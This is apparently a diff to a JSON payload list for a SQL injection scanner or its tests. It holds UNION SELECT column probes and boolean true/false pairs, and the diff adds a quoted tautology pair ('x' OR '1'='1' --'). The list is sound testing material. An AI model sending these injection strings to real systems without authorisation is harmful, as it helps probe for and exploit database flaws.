@@ -14,6 +14,7 @@
     {"payload_case_id": "attack-union-2col", "type": "single", "value": "' UNION SELECT NULL,NULL--"},
     {"payload_case_id": "attack-union-3col", "type": "single", "value": "' UNION SELECT NULL,NULL,NULL--"},
     {"payload_case_id": "attack-union-4col", "type": "single", "value": "' UNION SELECT NULL,NULL,NULL,NULL--"},
-    {"payload_case_id": "boolean-pair-1", "type": "boolean_pair", "true_value": "1 AND 1=1", "false_value": "1 AND 1=2"}
+    {"payload_case_id": "boolean-pair-1", "type": "boolean_pair", "true_value": "1 AND 1=1", "false_value": "1 AND 1=2"},
+    {"payload_case_id": "boolean-pair-quoted", "type": "boolean_pair", "true_value": "x' OR '1'='1' --", "false_value": "x' OR '1'='2' --"}
   ]
 }
